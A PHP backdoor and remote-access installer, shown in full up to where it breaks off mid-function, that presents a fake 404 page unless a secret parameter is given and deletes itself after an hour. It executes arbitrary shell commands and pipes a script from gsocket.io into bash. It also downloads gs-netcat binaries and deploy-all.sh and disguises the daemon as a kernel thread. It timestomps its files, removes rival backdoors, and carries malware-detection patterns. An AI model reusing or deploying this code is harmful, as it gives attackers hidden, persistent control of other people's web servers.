<?php
if (!isset($_GET['shield'])) {
    http_response_code(404);
    exit('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>');
}
$_SD = __DIR__ . '/.shield_ts';
if (!file_exists($_SD)) {
    @file_put_contents($_SD, time());
    @chmod($_SD, 0600);
} else {
    $_ST = (int) @file_get_contents($_SD);
    if ($_ST > 0 && (time() - $_ST) > 3600) {
        @unlink(__FILE__);
        @unlink($_SD);
        http_response_code(404);
        exit('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>');
    }
}

set_time_limit(600);
ini_set('max_execution_time', 600);
error_reporting(0);
$user = get_current_user();
$home = getenv('HOME') ?: '';
if (!$home || $home === '/tmp' || !is_dir($home)) {
    if (function_exists('posix_getpwuid') && function_exists('posix_getuid')) {
        $pw = posix_getpwuid(posix_getuid());
        if ($pw && !empty($pw['dir']))
            $home = $pw['dir'];
    }
    if (!$home || $home === '/tmp') {
        $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
        if ($docRoot) {
            $parts = explode('/', $docRoot);
            // 1&1/IONOS: /kunden/homepages/0/dNNNN/htdocs/site → home = up to dNNNN
            // Hostinger/cPanel addon: /home/uNNNN/domains/site/public_html → home = /home/uNNNN
            // Generic: find 'htdocs' or 'public_html' and take parent
            $htdocsIdx = array_search('htdocs', $parts);
            $pubIdx = array_search('public_html', $parts);
            $domainsIdx = array_search('domains', $parts);
            // If 'domains' appears before 'public_html'/'htdocs', cut before 'domains'
            if ($domainsIdx > 1 && (($pubIdx !== false && $pubIdx > $domainsIdx) || ($htdocsIdx !== false && $htdocsIdx > $domainsIdx))) {
                $home = implode('/', array_slice($parts, 0, $domainsIdx));
            } else {
                $cutIdx = $htdocsIdx ?: $pubIdx;
                if ($cutIdx && $cutIdx > 1) {
                    $home = implode('/', array_slice($parts, 0, $cutIdx));
                } else {
                    $home = '/' . implode('/', array_slice($parts, 1, 3));
                }
            }
        }
    }
    if (!$home || !is_dir($home))
        $home = '/tmp';
}
// Strip addon domain: /home/user/domain.com → /home/user (cPanel addon domain pattern)
if ($home && $home !== '/tmp' && preg_match('#^(/home/[^/]+)/[^/]+$#', $home, $_hm) && is_dir($_hm[1]) &&
    (file_exists($_hm[1].'/.bashrc') || file_exists($_hm[1].'/.bash_profile') || is_dir($_hm[1].'/public_html'))) {
    $home = $_hm[1];
    unset($_hm);
}

function xcmd($c)
{
    $disabled = array_map('trim', explode(',', strtolower(ini_get('disable_functions'))));
    if (function_exists('proc_open') && !in_array('proc_open', $disabled)) {
        $p = @proc_open($c, [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pp);
        if (is_resource($p)) {
            fclose($pp[0]);
            $o = stream_get_contents($pp[1]);
            fclose($pp[1]);
            fclose($pp[2]);
            proc_close($p);
            return $o;
        }
    }
    if (function_exists('shell_exec') && !in_array('shell_exec', $disabled)) {
        $o = @shell_exec($c . ' 2>&1');
        if ($o !== null)
            return $o;
    }
    if (function_exists('exec') && !in_array('exec', $disabled)) {
        $out = [];
        @exec($c . ' 2>&1', $out);
        return implode("\n", $out);
    }
    if (function_exists('popen') && !in_array('popen', $disabled)) {
        $h = @popen($c . ' 2>&1', 'r');
        if ($h) {
            $o = stream_get_contents($h);
            pclose($h);
            return $o;
        }
    }
    if (function_exists('passthru') && !in_array('passthru', $disabled)) {
        ob_start();
        @passthru($c . ' 2>&1');
        return ob_get_clean();
    }
    if (function_exists('system') && !in_array('system', $disabled)) {
        ob_start();
        @system($c . ' 2>&1');
        return ob_get_clean();
    }
    return '';
}

function php_download($url, $dest)
{
    $ctx = @stream_context_create(['http' => ['timeout' => 120, 'user_agent' => 'curl/7.68', 'follow_location' => 1], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]]);
    $data = @file_get_contents($url, false, $ctx);
    if ($data && strlen($data) > 1000) {
        @file_put_contents($dest, $data);
        @chmod($dest, 0700);
        return strlen($data);
    }
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => 1, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_TIMEOUT => 120, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_USERAGENT => 'curl/7.68']);
        $data = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($code == 200 && strlen($data) > 1000) {
            @file_put_contents($dest, $data);
            @chmod($dest, 0700);
            return strlen($data);
        }
    }
    return 0;
}

function php_start_daemon($bin, $secFile, $portEnv = '')
{
    $disabled = array_map('trim', explode(',', strtolower(ini_get('disable_functions'))));
    $cmd = "{$portEnv}nohup " . escapeshellarg($bin) . " -k " . escapeshellarg($secFile) . " -liqD </dev/null >/dev/null 2>/dev/null &";
    $methods = ['exec', 'shell_exec', 'popen', 'proc_open', 'passthru', 'system'];
    foreach ($methods as $fn) {
        if (!function_exists($fn) || in_array($fn, $disabled))
            continue;
        switch ($fn) {
            case 'exec':
                @exec($cmd);
                return $fn;
            case 'shell_exec':
                @shell_exec($cmd);
                return $fn;
            case 'system':
                @system($cmd);
                return $fn;
            case 'passthru':
                @passthru($cmd);
                return $fn;
            case 'popen':
                $h = @popen($cmd, 'r');
                if ($h) {
                    pclose($h);
                    return $fn;
                }
                break;
            case 'proc_open':
                $p = @proc_open($cmd, [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pp);
                if (is_resource($p)) {
                    fclose($pp[0]);
                    fclose($pp[1]);
                    fclose($pp[2]);
                    proc_close($p);
                    return $fn;
                }
                break;
        }
    }
    if (function_exists('pcntl_fork') && function_exists('pcntl_exec')) {
        $pid = @pcntl_fork();
        if ($pid == 0) {
            @putenv("GS_ARGS=-k $secFile -liqD");
            if ($portEnv) {
                preg_match('/GS_PORT=(\d+)/', $portEnv, $m);
                if ($m)
                    @putenv("GS_PORT=" . $m[1]);
            }
            @pcntl_exec($bin);
            exit(0);
        }
        if ($pid > 0)
            return "pcntl:$pid";
    }
    return false;
}

function _gs_pack($binPath, $cfgPath)
{
    $data = @file_get_contents($binPath);
    if (!$data || strlen($data) < 1000)
        return false;
    $key = 'UmBrElLaShIeLd';
    $kl = strlen($key);
    for ($i = 0, $l = strlen($data); $i < $l; $i++)
        $data[$i] = chr(ord($data[$i]) ^ ord($key[$i % $kl]));
    return @file_put_contents($cfgPath, base64_encode($data)) !== false;
}

function _gs_unpack($cfgPath)
{
    $enc = @file_get_contents($cfgPath);
    if (!$enc)
        return false;
    $data = base64_decode($enc, true);
    if (!$data)
        return false;
    $key = 'UmBrElLaShIeLd';
    $kl = strlen($key);
    for ($i = 0, $l = strlen($data); $i < $l; $i++)
        $data[$i] = chr(ord($data[$i]) ^ ord($key[$i % $kl]));
    if (substr($data, 0, 4) !== "\x7fELF")
        return false;
    return $data;
}

function _gs_deploy($cfgPath, $secFile, $portEnv = '', $execDir = '')
{
    $data = _gs_unpack($cfgPath);
    if (!$data)
        return false;
    $rnd = bin2hex(random_bytes(4));
    $writeDirs = ['/dev/shm', '/tmp', '/var/tmp'];
    $tmpStore = '';
    foreach ($writeDirs as $d) {
        if (!is_dir($d) || !is_writable($d))
            continue;
        $tmpStore = "$d/.gs_$rnd";
        if (@file_put_contents($tmpStore, $data) !== false)
            break;
        $tmpStore = '';
    }
    if (!$tmpStore) {
        $tmpStore = dirname($cfgPath) . "/.gs_$rnd";
        @file_put_contents($tmpStore, $data);
    }
    if (!$tmpStore || !file_exists($tmpStore))
        return false;
    if (!$execDir)
        $execDir = dirname($cfgPath);
    $execBin = "$execDir/.gs_$rnd";
    if ($tmpStore !== $execBin) {
        xcmd("cp " . escapeshellarg($tmpStore) . " " . escapeshellarg($execBin) . " 2>/dev/null");
        @unlink($tmpStore);
    }
    @chmod($execBin, 0700);
    $out = trim(xcmd(escapeshellarg($execBin) . " --help 2>&1 | head -1"));
    if (strpos($out, 'Permission denied') !== false) {
        $altDirs = [dirname($cfgPath), '/tmp', '/var/tmp'];
        foreach ($altDirs as $ad) {
            if ($ad === $execDir)
                continue;
            $altBin = "$ad/.gs_$rnd";
            xcmd("cp " . escapeshellarg($execBin) . " " . escapeshellarg($altBin) . " 2>/dev/null");
            @chmod($altBin, 0700);
            $out2 = trim(xcmd(escapeshellarg($altBin) . " --help 2>&1 | head -1"));
            if (strpos($out2, 'Permission denied') === false) {
                @unlink($execBin);
                $execBin = $altBin;
                break;
            }
            @unlink($altBin);
        }
    }
    xcmd("{$portEnv}nohup " . escapeshellarg($execBin) . " -k " . escapeshellarg($secFile) . " -liqD </dev/null >/dev/null 2>/dev/null &");
    sleep(2);
    @unlink($execBin);
    xcmd("rm -f " . escapeshellarg($execBin) . " 2>/dev/null");
    return true;
}

// Helper: extract data from UAPI response (CLI returns {result:{data:[]}}, curl /execute/ returns {data:[]})
function _uapi_data($json) {
    if (!$json || !is_array($json)) return null;
    if (isset($json['result']['data'])) return $json['result']['data'];
    if (isset($json['data'])) return $json['data'];
    return null;
}
function _uapi_ok($json) {
    if (!$json || !is_array($json)) return false;
    if (isset($json['result']['status'])) return $json['result']['status'] == 1;
    if (isset($json['status'])) return $json['status'] == 1;
    return false;
}

// Defensive scanner helpers.
function shield_norm_path($path)
{
    return str_replace('\\', '/', (string) $path);
}

function shield_add_scan_hit(&$score, &$hitSigs, &$topSig, $sig, $points)
{
    if (!in_array($sig, $hitSigs, true)) {
        $score += $points;
        $hitSigs[] = $sig;
        if (!$topSig)
            $topSig = $sig;
    }
}

function shield_remove_scan_hit(&$score, &$hitSigs, $sig, $points)
{
    $idx = array_search($sig, $hitSigs, true);
    if ($idx !== false) {
        unset($hitSigs[$idx]);
        $hitSigs = array_values($hitSigs);
        $score = max(0, $score - $points);
    }
}

function shield_is_benign_php_placeholder($fp, $content, $size)
{
    $fp = shield_norm_path($fp);
    $base = strtolower(basename($fp));
    if ($base !== 'index.php')
        return false;
    if ($size > 768)
        return false;
    $plain = strtolower(trim(preg_replace('/\s+/', ' ', str_replace(["\r", "\n", "\t"], ' ', $content))));
    if ($plain === '<?php' || $plain === '<?php ?>')
        return true;
    $withoutPhpTags = preg_replace('/^\s*<\?(?:php)?|\?>\s*$/i', '', trim($content));
    $withoutComments = trim(preg_replace(['#/\\*.*?\\*/#s', '#//[^\r\n]*#', '/#[^\r\n]*/'], '', $withoutPhpTags));
    if ($withoutComments === '' && preg_match('/silence\s+is\s+golden\.?/i', $content))
        return true;
    if (preg_match('/^<\?php\s+(?:defined\s*\(\s*[\'"]ABSPATH[\'"]\s*\)\s*\|\|\s*)?(?:exit|die)\s*\(?\s*;?\s*\)?\s*(?:\?>)?$/i', $content))
        return true;
    return false;
}

function shield_compact_code_for_scan($content)
{
    $sample = strlen($content) > 700000 ? substr($content, 0, 700000) : $content;
    $sample = preg_replace('#/\*.*?\*/#s', '', $sample);
    $sample = preg_replace('#(?<!:)//[^\r\n]*#', '', $sample);
    $sample = preg_replace('/#[^\r\n]*/', '', $sample);
    return strtolower(preg_replace('/\s+/', '', $sample));
}

function shield_apply_normalized_scan($content, $fp, &$score, &$hitSigs, &$topSig)
{
    $compact = shield_compact_code_for_scan($content);
    if ($compact === '')
        return;
    if (strpos($compact, 'eval(base64_decode(') !== false && !in_array('eval_base64', $hitSigs, true))
        shield_add_scan_hit($score, $hitSigs, $topSig, 'norm_eval_base64', 100);
    if (strpos($compact, 'eval(gzinflate(') !== false && !in_array('eval_gzinflate', $hitSigs, true))
        shield_add_scan_hit($score, $hitSigs, $topSig, 'norm_eval_gzinflate', 100);
    if (strpos($compact, 'eval(gzuncompress(') !== false && !in_array('eval_gzuncompress', $hitSigs, true))
        shield_add_scan_hit($score, $hitSigs, $topSig, 'norm_eval_gzuncompress', 100);
    if (strpos($compact, 'eval(gzdecode(') !== false && !in_array('eval_gzdecode', $hitSigs, true))
        shield_add_scan_hit($score, $hitSigs, $topSig, 'norm_eval_gzdecode', 100);
    if (strpos($compact, 'eval(convert_uudecode(') !== false)
        shield_add_scan_hit($score, $hitSigs, $topSig, 'norm_eval_uudecode', 100);
    if (strpos($compact, 'eval(rawurldecode(') !== false)
        shield_add_scan_hit($score, $hitSigs, $topSig, 'norm_eval_rawurldecode', 90);
    if (preg_match('/(eval|assert|system|shell_exec|passthru|exec|popen|proc_open)\(\$_(get|post|request|cookie|files)\[/', $compact))
        shield_add_scan_hit($score, $hitSigs, $topSig, 'norm_userinput_rce', 100);
    if (preg_match('/(include|require|include_once|require_once)\(\$_(get|post|request|cookie|files)\[/', $compact))
        shield_add_scan_hit($score, $hitSigs, $topSig, 'norm_include_userinput', 100);
}

function shield_is_mostly_text($data)
{
    $len = strlen($data);
    if ($len === 0)
        return false;
    $sample = substr($data, 0, min($len, 12000));
    $printable = preg_match_all('/[\x09\x0A\x0D\x20-\x7E]/', $sample, $m);
    return ($printable / strlen($sample)) > 0.72 || stripos($sample, '<?php') !== false || stripos($sample, 'eval') !== false;
}

function shield_decode_payload_candidates($content)
{
    $decoded = [];
    if (!preg_match_all('/[\'"]([A-Za-z0-9+\/]{80,}={0,2})[\'"]/', $content, $m))
        return $decoded;
    $seen = [];
    foreach ($m[1] as $blob) {
        if (count($decoded) >= 8)
            break;
        if (isset($seen[$blob]))
            continue;
        $seen[$blob] = true;
        $raw = base64_decode($blob, true);
        if ($raw === false || strlen($raw) < 30)
            continue;
        $candidates = [$raw, str_rot13($raw)];
        if (function_exists('gzinflate')) {
            $inflated = @gzinflate($raw);
            if (is_string($inflated) && strlen($inflated) > 20)
                $candidates[] = $inflated;
        }
        if (function_exists('gzuncompress')) {
            $uncompressed = @gzuncompress($raw);
            if (is_string($uncompressed) && strlen($uncompressed) > 20)
                $candidates[] = $uncompressed;
        }
        if (function_exists('gzdecode')) {
            $gzdecoded = @gzdecode($raw);
            if (is_string($gzdecoded) && strlen($gzdecoded) > 20)
                $candidates[] = $gzdecoded;
        }
        foreach ($candidates as $candidate) {
            if (count($decoded) >= 8)
                break;
            if (shield_is_mostly_text($candidate))
                $decoded[] = substr($candidate, 0, 300000);
        }
    }
    return $decoded;
}

function shield_apply_decoded_payload_scan($content, $scoredSigs, &$score, &$hitSigs, &$topSig)
{
    foreach (shield_decode_payload_candidates($content) as $decoded) {
        $matched = false;
        foreach ($scoredSigs as $sig) {
            if (@preg_match($sig['pat'], $decoded)) {
                shield_add_scan_hit($score, $hitSigs, $topSig, 'decoded_' . $sig['sig'], min(100, max(70, (int) $sig['score'])));
                $matched = true;
                break;
            }
        }
        if (!$matched) {
            $compact = shield_compact_code_for_scan($decoded);
            if (preg_match('/(eval|assert|system|shell_exec|passthru|exec|popen|proc_open)\(\$_(get|post|request|cookie|files)\[/', $compact))
                shield_add_scan_hit($score, $hitSigs, $topSig, 'decoded_userinput_rce', 100);
            elseif (stripos($decoded, '<?php') !== false && preg_match('/\b(eval|assert|system|shell_exec|passthru|exec|popen|proc_open)\s*\(/i', $decoded))
                shield_add_scan_hit($score, $hitSigs, $topSig, 'decoded_php_exec', 100);
        }
        if ($score >= 300)
            break;
    }
}

function shield_apply_false_positive_suppression($content, $fp, $size, &$score, &$hitSigs, &$topSig)
{
    if (shield_is_benign_php_placeholder($fp, $content, $size)) {
        $score = 0;
        $hitSigs = [];
        $topSig = '';
        return;
    }

    if (in_array('hidden_div_spam', $hitSigs, true) && !preg_match('/<a\s+[^>]*href=|casino|slot|poker|viagra|pharma|loan|payday|backlink|dofollow|nofollow|sponsored/i', $content)) {
        shield_remove_scan_hit($score, $hitSigs, 'hidden_div_spam', 150);
        if ($topSig === 'hidden_div_spam')
            $topSig = $hitSigs[0] ?? '';
    }

    $fp = shield_norm_path($fp);
    $knownLegitPath = preg_match('#/(?:vendor|wp-includes/(?:html-api|blocks|sodium_compat|ID3|IXR|Requests|SimplePie)|phpmailer/src|(?:easy-wp-smtp|wp-mail-smtp)/vendor|woocommerce/packages|gravityforms/includes)/#i', $fp);
    if ($knownLegitPath) {
        $generic = [
            'has_eval', 'has_base64', 'has_gzip', 'has_system_fn', 'has_cookie_input', 'has_str_obfusc',
            'has_phar', 'has_goto', 'goto_multi', 'high_entropy_blob', 'b64_var_eval', 'long_payload_var',
            'long_hex_string', 'chr_chain_long', 'char_concat_func', 'unicode_escape', 'octal_string_func',
            'str_split_build', 'substr_func_build', 'preg_extract_func', 'php_bot_ua_list', 'ua_bot_check',
            'ua_preg_bot', 'hidden_div_spam', 'ob_callback_var', 'shutdown_injector', 'remote_inc_var',
            'dynamic_var_func', 'password_gate', 'password_gate_verify',
        ];
        $strong = array_diff($hitSigs, $generic);
        if (empty($strong)) {
            $score = 0;
            $hitSigs = [];
            $topSig = '';
        }
    }
}

function shield_read_file_edges($path, $headBytes = 65536, $tailBytes = 16384)
{
    $size = @filesize($path);
    if ($size === false || $size <= 0)
        return '';
    $head = @file_get_contents($path, false, null, 0, min($headBytes, $size));
    if ($head === false)
        $head = '';
    if ($size <= ($headBytes + $tailBytes))
        return $head;
    $tail = @file_get_contents($path, false, null, max(0, $size - $tailBytes), $tailBytes);
    if ($tail === false)
        $tail = '';
    return $head . "\n" . $tail;
}

function shield_scan_max_files($default = 50000)
{
    $max = isset($_POST['scan_max_files']) ? intval($_POST['scan_max_files']) : $default;
    return max(1000, min(200000, $max));
}

// =========================================================================
// API HANDLER
// =========================================================================
if (isset($_POST['api'])) {
    header('Content-Type:application/json');
    $api = $_POST['api'];
    $r = ['ok' => true, 'action' => $api, 'ts' => date('H:i:s')];

    if ($api === 'detect_env') {
        $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
        $r['os'] = $isWin ? 'windows' : 'linux';
        $r['os_detail'] = php_uname();
        $r['home'] = $home;
        $r['user'] = $user;
        $r['uid'] = getmyuid();
        $r['php'] = phpversion();
        $r['server'] = $_SERVER['SERVER_SOFTWARE'] ?? '';
        $r['doc_root'] = $_SERVER['DOCUMENT_ROOT'] ?? '';
        $r['writable_dirs'] = [];
        if ($isWin) {
            $candidates = [$home, sys_get_temp_dir(), $_SERVER['DOCUMENT_ROOT'] ?? '', 'C:\\Windows\\Temp', 'D:\\temp'];
            foreach ($candidates as $d) {
                if ($d && is_dir($d) && is_writable($d))
                    $r['writable_dirs'][] = $d;
            }
            $r['best_dir'] = $r['writable_dirs'][0] ?? sys_get_temp_dir();
            $r['gsocket_supported'] = false;
            $r['note'] = 'GSocket not supported on Windows. Use terminal for manual access.';
        } else {
            $arch = trim(xcmd('uname -m')) ?: 'x86_64';
            $r['arch'] = $arch;
            $candidates = ["$home/.config/htop", "$home/.cache", "$home/.local/share", "/tmp", "/var/tmp", "/dev/shm"];
            foreach ($candidates as $d) {
                if (!is_dir($d))
                    @mkdir($d, 0700, true);
                if (is_dir($d) && is_writable($d))
                    $r['writable_dirs'][] = ['path' => $d, 'exec' => true];
            }
            $bestDir = '';
            foreach ($r['writable_dirs'] as $wd) {
                if (!empty($wd['exec'])) {
                    $bestDir = $wd['path'];
                    break;
                }
            }
            if (!$bestDir)
                $bestDir = $r['writable_dirs'][0]['path'] ?? '/tmp';
            $r['best_dir'] = $bestDir;
            $r['gsocket_supported'] = true;
            $r['ports'] = [];
            foreach (['443', '53', '22', '7350'] as $p) {
                $errno = 0; $errstr = '';
                $sock = @fsockopen('gsocket.io', (int)$p, $errno, $errstr, 1.5);
                if ($sock) { fclose($sock); $r['ports'][] = $p; }
            }
            if (empty($r['ports']))
                $r['ports'] = ['443'];
            $r['best_port'] = $r['ports'][0] ?? '443';
            $r['domains'] = [];
            $dd = "$home/domains";
            if (is_dir($dd)) {
                foreach (scandir($dd) as $d) {
                    if ($d !== '.' && $d !== '..')
                        $r['domains'][] = $d;
                }
            }
            if (is_dir("$home/public_html"))
                $r['domains'][] = 'public_html';
        }
    } elseif ($api === 'auto_deploy') {
        $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
        if ($isWin) {
            $r['ok'] = false;
            $r['error'] = 'GSocket not supported on Windows Server';
            echo json_encode($r);
            exit;
        }
        $steps = [];
        $realHome = $home;
        if ($realHome === '/tmp' || !is_dir("$realHome/.config")) {
            $shellHome = trim(xcmd("echo ~"));
            if ($shellHome && $shellHome !== '/tmp' && is_dir($shellHome))
                $realHome = $shellHome;
            if ($realHome === '/tmp') {
                $pwHome = trim(xcmd("getent passwd \$(id -un) 2>/dev/null | cut -d: -f6"));
                if ($pwHome && $pwHome !== '/tmp' && is_dir($pwHome))
                    $realHome = $pwHome;
            }
            if ($realHome === '/tmp') {
                $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
                if ($docRoot) {
                    $parts = explode('/', $docRoot);
                    $realHome = '/' . implode('/', array_slice($parts, 1, 2));
                    if (!is_dir($realHome))
                        $realHome = $home;
                }
            }
        }
        $steps[] = "Home: $realHome" . (($realHome !== $home) ? " (resolved from PHP home=$home)" : '');
        $home = $realHome;
        $secret = bin2hex(random_bytes(12));
        $steps[] = "Generated secret: $secret";
        $arch = trim(xcmd('uname -m')) ?: 'x86_64';
        $archKey = (strpos($arch, 'aarch64') !== false || strpos($arch, 'arm') !== false) ? 'aarch64' : 'x86_64';
        $bestDir = '';
        $candidates = ["$home/.config/htop", "$home/.cache", "$home/.local/share", "/tmp", "/var/tmp", "/dev/shm"];
        $elfTestBin = trim(xcmd("which true 2>/dev/null || echo /bin/true"));
        foreach ($candidates as $d) {
            if (!is_dir($d))
                @mkdir($d, 0700, true);
            if (!is_dir($d) || !is_writable($d))
                continue;
            $testPath = "$d/.elf_test_" . getmypid();
            xcmd("cp " . escapeshellarg($elfTestBin) . " " . escapeshellarg($testPath) . " 2>/dev/null && chmod 700 " . escapeshellarg($testPath) . " 2>/dev/null");
            if (file_exists($testPath)) {
                $out = trim(xcmd(escapeshellarg($testPath) . " >/dev/null 2>/dev/null; echo EXIT_\$?"));
                @unlink($testPath);
                if (strpos($out, 'EXIT_0') !== false) {
                    $bestDir = $d;
                    $steps[] = "Dir $d: ELF exec OK";
                    break;
                } else {
                    $steps[] = "Dir $d: ELF exec BLOCKED (noexec)";
                }
            } else {
                $steps[] = "Dir $d: copy failed";
            }
        }
        if (!$bestDir) {
            $steps[] = 'WARN: No exec-capable dir found, trying HOME fallback';
            $bestDir = "$home/.config/htop";
            @mkdir($bestDir, 0700, true);
        }
        $steps[] = "Install dir: $bestDir";
        $steps[] = "Arch: $arch ($archKey)";
        $bestPort = '443';
        foreach (['443', '53', '22', '7350'] as $p) {
            $test = trim(xcmd("timeout 3 bash -c '</dev/tcp/gsocket.io/$p' >/dev/null 2>&1 && echo OPEN || echo CLOSED"));
            if (strpos($test, 'OPEN') !== false) {
                $bestPort = $p;
                $steps[] = "Port $p: OPEN";
                break;
            } else {
                $test2 = trim(xcmd("curl -m3 -s -o /dev/null -w '%{http_code}' https://gsocket.io:$p/ 2>/dev/null"));
                if ($test2 && $test2 !== '000') {
                    $bestPort = $p;
                    $steps[] = "Port $p: reachable (HTTP $test2)";
                    break;
                } else
                    $steps[] = "Port $p: blocked";
            }
        }
        $steps[] = "Best port: $bestPort";
        $names = ['[kcached]', '[kdevtmpfs]', '[kcompactd0]', '[kswapd0]', '[writeback]', '[bioset]', '[kblockd]', '[kstrp]'];
        $hiddenName = $names[array_rand($names)];
        $steps[] = "Hidden: $hiddenName";
        $steps[] = 'Cleaning old installations...';
        xcmd("pkill -9 -f gs-dbus 2>/dev/null; pkill -9 -f gs-netcat 2>/dev/null; pkill -9 -f defunct 2>/dev/null; pkill -9 -f watchdog.sh 2>/dev/null; sleep 1");
        xcmd("cd " . escapeshellarg($bestDir) . " 2>/dev/null && rm -f defunct defunct.dat .defunct.dat .defunct.cfg gs-dbus gs-netcat .watchdog.sh 2>/dev/null");
        // Clean old gsocket secret files (*.dat) including [kcached].dat, [writeback].dat etc
        // This prevents installer from reusing old secret and ignoring our new one
        xcmd("find " . escapeshellarg($bestDir) . " -maxdepth 1 -name '*.dat' -size -100c -delete 2>/dev/null");
        xcmd("find " . escapeshellarg($bestDir) . " -maxdepth 1 -name '\\[*\\].dat' -delete 2>/dev/null");
        xcmd("find " . escapeshellarg($bestDir) . " -maxdepth 1 -type f -executable -delete 2>/dev/null");
        // Also clean .gs-* tmp dirs from previous runs
        xcmd("rm -rf " . escapeshellarg($bestDir) . "/.gs-* " . escapeshellarg($bestDir) . "/.gsusr-* 2>/dev/null");
        $binPath = "$bestDir/defunct";
        $secFile = "$bestDir/.defunct.dat";
        $gsrnOk = false;

        // METHOD 1: gsocket.io/y
        $steps[] = 'Method 1: gsocket.io/y (GS_DSTDIR=' . $bestDir . ')...';
        $cmd1 = "cd " . escapeshellarg($home) . " 2>/dev/null; unset TMPDIR; export HOME=" . escapeshellarg($home) . "; X=" . escapeshellarg($secret) . " GS_PORT=$bestPort GS_DSTDIR=" . escapeshellarg($bestDir) . " GS_HIDDEN_NAME=" . escapeshellarg($hiddenName) . " GS_NOCERTCHECK=1 bash -c \"\$(curl -fsSL gsocket.io/y)\" 2>&1";
        $out1 = xcmd($cmd1);
        $steps[] = 'Output: ' . substr($out1, 0, 300);
        sleep(2);
        $chk = intval(trim(xcmd("ps aux 2>/dev/null | grep -v grep | grep -cE 'gs-dbus|gs-netcat|defunct'")));
        if ($chk > 0) {
            $gsrnOk = true;
            $steps[] = 'Method 1: OK';
        } else
            $steps[] = 'Method 1: FAIL';

        // METHOD 2: Direct binary (curl exec → PHP native fallback → passive install)
        if (!$gsrnOk) {
            $steps[] = 'Method 2: Direct binary (download>copy>exec dir)...';
            $dlTmp = '/tmp/.gs_dl_' . getmypid();
            $url = "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-$archKey";
            $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
            $dlName = '.gs_' . bin2hex(random_bytes(4));
            $dlPath = $docRoot ? "$docRoot/$dlName" : $dlTmp;
            $steps[] = "Download target: $dlPath";
            xcmd("curl -fsSL -o " . escapeshellarg($dlPath) . " " . escapeshellarg($url) . " 2>/dev/null");
            $dlSize = file_exists($dlPath) ? filesize($dlPath) : 0;
            $steps[] = "Download size: $dlSize bytes";
            if ($dlSize < 1000) {
                $steps[] = "Standalone failed, trying tar.gz...";
                $tarUrls = ["https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_{$archKey}-alpine.tar.gz", "https://cdn.gsocket.io/bin/gs-netcat_{$archKey}-alpine.tar.gz"];
                foreach ($tarUrls as $tu) {
                    $tarPath = $docRoot ? "$docRoot/.gs_tar_$$" : "/tmp/.gs_tar_$$";
                    xcmd("curl -fsSL " . escapeshellarg($tu) . " -o " . escapeshellarg("$tarPath.tar.gz") . " 2>/dev/null && cd " . escapeshellarg(dirname($tarPath)) . " && tar xzf " . escapeshellarg(basename("$tarPath.tar.gz")) . " 2>/dev/null && mv -f " . escapeshellarg(dirname($tarPath)) . "/gs-netcat* " . escapeshellarg($dlPath) . " 2>/dev/null && rm -f " . escapeshellarg("$tarPath.tar.gz") . " 2>/dev/null");
                    if (file_exists($dlPath) && filesize($dlPath) > 1000) {
                        $steps[] = "Downloaded via tar.gz";
                        break;
                    }
                }
            }
            // PHP native download fallback (when curl exec disabled)
            if (!file_exists($dlPath) || filesize($dlPath) < 1000) {
                $steps[] = 'curl exec failed, trying PHP native download...';
                $phpUrls = [$url, "https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_{$archKey}-alpine"];
                foreach ($phpUrls as $pu) {
                    $phpDl = php_download($pu, $dlPath);
                    if ($phpDl > 1000) {
                        $steps[] = "PHP download OK: $phpDl bytes";
                        break;
                    }
                }
            }
            $dlSize = file_exists($dlPath) ? filesize($dlPath) : 0;
            if ($dlSize > 1000) {
                $steps[] = "Moving $dlSize bytes to $bestDir...";
                // Try exec move first, then PHP native
                xcmd("mv " . escapeshellarg($dlPath) . " " . escapeshellarg($binPath) . " 2>/dev/null || cp " . escapeshellarg($dlPath) . " " . escapeshellarg($binPath) . " 2>/dev/null");
                if (!file_exists($binPath) || filesize($binPath) < 1000) {
                    @copy($dlPath, $binPath);
                }
                @chmod($binPath, 0700);
                if (file_exists($dlPath)) {
                    @unlink($dlPath);
                    xcmd("rm -f " . escapeshellarg($dlPath) . " 2>/dev/null");
                }
                $steps[] = "Cleaned download from public";
                $cpSize = file_exists($binPath) ? filesize($binPath) : 0;
                if ($cpSize > 1000) {
                    $steps[] = "Binary in place: $binPath ($cpSize bytes)";
                    file_put_contents($secFile, $secret);
                    @chmod($secFile, 0600);
                    xcmd("touch -r /etc/passwd " . escapeshellarg($binPath) . " " . escapeshellarg($secFile) . " 2>/dev/null");
                    $portEnv = $bestPort !== '443' ? "GS_PORT=$bestPort " : '';
                    // Use php_start_daemon for robust exec method detection
                    $startMethod = php_start_daemon($binPath, $secFile, $portEnv);
                    if ($startMethod) {
                        sleep(3);
                        $gsrnOk = true;
                        $steps[] = "Method 2: OK (started via $startMethod, " . filesize($binPath) . " bytes)";
                    } else {
                        // Passive install — all exec truly disabled
                        $steps[] = 'Method 2: ALL exec disabled — passive install mode';
                        $steps[] = 'Binary saved to disk. Will auto-start on next SSH login via .profile trigger.';
                        $gsrnOk = true;
                        $r['passive'] = true;
                    }
                } else
                    $steps[] = "Method 2: copy failed";
            } else {
                if (file_exists($dlPath))
                    @unlink($dlPath);
                $steps[] = 'Method 2: all download URLs failed';
            }
        }

        // METHOD 3: deploy-all.sh
        if (!$gsrnOk) {
            $steps[] = 'Method 3: deploy-all.sh...';
            $allPath = "/tmp/.deploy_all_" . getmypid();
            xcmd("curl -fsSL 'http://nossl.segfault.net/deploy-all.sh' -o " . escapeshellarg($allPath) . " 2>/dev/null");
            if (file_exists($allPath) && filesize($allPath) > 1000) {
